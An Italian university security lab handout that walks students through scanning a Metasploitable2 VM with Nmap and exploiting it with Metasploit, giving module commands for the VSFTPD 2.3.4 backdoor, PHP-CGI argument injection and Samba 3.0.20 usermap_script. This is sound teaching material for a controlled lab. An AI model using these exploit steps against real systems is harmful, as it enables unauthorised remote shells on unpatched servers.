---
layout: default
title: Sfruttamento di vulnerabilita'
description: Prof.ssa Federica Paci
---

In questo laboratorio utilizzeremo la macchina virtuale Kali Linux e la macchina virtuale Metasploitable2. Le due macchine virtuali devono essere collegate da una rete interna. 

Kali Linux è una distribuzione Linux basata su Debian, progettata specificamente per la sicurezza informatica e il penetration testing. Sviluppata e mantenuta dall'azienda Offensive Security, Kali Linux è dotata di un vasto assortimento di strumenti preinstallati per eseguire una varietà di compiti legati alla sicurezza, come penetration testing, analisi di vulnerabilità, digital forensics e reverse engineering del codice. 

Metasploitable 2 è una macchina virtuale vulnerabile, progettata intenzionalmente per essere utilizzata come target di attacchi in ambienti di test di sicurezza informatica. Sviluppata dal team di Rapid7, Metasploitable 2 serve come una piattaforma di apprendimento e pratica per i penetration tester e gli studenti di cybersecurity, permettendo loro di esplorare e testare tecniche di attacco in un ambiente controllato e sicuro.

# Abilitare account root su Kali Linux VM 

Aprite un terminale e digitate il seguente comando:

```
# sudo passwd
```
Vi verra' richiesto di inserire la password per l'utente root.

# Determinare indirizzo IP di Kali Linux e Metasploitable2

Aprite un terminale e digitate il seguente comando:

```
# ifconfig
```

# Scoprire le vulnerabilita' presenti in Metasploitable2

Per scoprire le vulnerabilita' utilizzeremo Nmap. Nmap è ampiamente utilizzato da amministratori di rete, professionisti della sicurezza informatica e hacker etici per identificare dispositivi attivi, scoprire servizi disponibili e rilevare vulnerabilità all'interno di una rete.

Aprite un terminale e digitate il seguente comando:


```
# nmap -sV --script vuln <INDIRIZZO IP METASPLOITABLE2>
```

# Sfruttamento di VSFTPD 2.3.4

VSFTPD (Very Secure FTP Daemon) è un server FTP comunemente utilizzato per la sua velocità e sicurezza. Tuttavia, la versione 2.3.4 di VSFTPD contiene una vulnerabilità critica che può essere sfruttata dagli attaccanti per ottenere accesso non autorizzato al sistema.

## Dettagli della vulnerabilità
La vulnerabilità in VSFTPD 2.3.4 riguarda un backdoor malevolo introdotto nel codice sorgente ufficiale. Quando un utente si connette al server FTP e fornisce una combinazione di nome utente che termina con ":)", il server apre una shell sulla porta 6200, permettendo all'attaccante di ottenere accesso remoto al sistema.

## Passi per sfruttare la vulnerabilita'

Per sfruttare questa vulnerabilita' useremo Metasploit. Metasploit è un framework open-source utilizzato per il penetration testing e lo sviluppo di exploit, creato originariamente da H.D. Moore. Metasploit fornisce una vasta gamma di strumenti e risorse che permettono ai professionisti della sicurezza informatica di identificare, verificare e sfruttare le vulnerabilità nei sistemi informatici.

### Caratteristiche principali di Metasploit
* Libreria di exploit: Metasploit include una vasta raccolta di exploit preconfigurati che possono essere utilizzati per sfruttare vulnerabilità conosciute in software, sistemi operativi e applicazioni.

* Payloads: Metasploit permette agli utenti di scegliere diversi payload, ovvero il codice eseguito dopo che un exploit ha avuto successo. I payload possono variare da semplici comandi di sistema a interi interpreti come Meterpreter, che offre una shell avanzata con funzionalità di post-sfruttamento.

* Auxiliary modules: Oltre agli exploit, Metasploit include moduli ausiliari che possono essere utilizzati per eseguire una varietà di funzioni, come la scansione di rete, il fuzzing delle applicazioni e l'analisi delle vulnerabilità.

* Post-exploitation: Una volta che un sistema è stato compromesso, Metasploit offre una serie di strumenti per l'esecuzione di attività di post-sfruttamento, come la raccolta di informazioni, il movimento laterale e la persistenza.

Metasploit può essere utilizzato attraverso un'interfaccia a riga di comando (msfconsole).

#### Avvio di Metasploit:
```
# msfconsole
```
#### Ricerca di un exploit:

```
# search vsftpd 2.3.4
```
#### Caricamento di un modulo di exploit:

```
# use exploit/unix/ftp/vsftpd_234_backdoor
```

#### Impostazione delle opzioni del payload:
```
# set RHOST <INDIRIZZO IP METASPLOITABLE2>
```

#### Esecuzione dell'exploit:

```
# run
```
# Sfruttamento della vulnerabilità di PHP 2.4.2

Sappiamo che la porta 80 è aperta, quindi digitiamo l'indirizzo IP di Metasploitable 2 nel nostro browser e notiamo che è in esecuzione PHP. Indagando un po' più a fondo, scopriamo quale versione di PHP è in esecuzione e notiamo anche che è eseguita come CGI. Ora sfrutteremo la vulnerabilità di iniezione degli argomenti di PHP 2.4.2 utilizzando Metasploit.

## Dettagli della vulnerabilità

La vulnerabilità di iniezione degli argomenti di PHP 2.4.2 su Metasploitable 2 è una falla di sicurezza che consente a un attaccante remoto di eseguire comandi arbitrari sul server web. Questa vulnerabilità è presente quando PHP è configurato per essere eseguito come CGI (Common Gateway Interface). L'attacco sfrutta un'errata gestione degli argomenti di input forniti a PHP attraverso l'URL.

## Passi per sfruttare la vulnerabilita'

```
# msfconsole
# search php cgi
# use exploit/multi/http/php_cgi_arg_injection
# set RHOST <INDIRIZZO IP METASPLOITABLE2>
# exploit
```
# Sfruttamento della vulnerabilità di Samaba 3.0.20

Questo modulo sfrutta una vulnerabilità di esecuzione di comandi presenta nella versione di Samba 3.0.20 quando viene utilizzata l'opzione di configurazione non predefinita "username map script.

## Dettagli della vulnerabilità
Specificando un nome utente che contiene caratteri meta della shell, gli attaccanti possono eseguire comandi arbitrari. Non è necessaria alcuna autenticazione per sfruttare questa vulnerabilità, poiché questa opzione è utilizzata per mappare i nomi utente prima dell'autenticazione.

## Passi per sfruttare la vulnerabilita'

```
# msfconsole
# search samba username map script
# use exploit/multi/samba/usermap_script
# set RHOST <INDIRIZZO IP METASPLOITABLE2>
# exploit
```

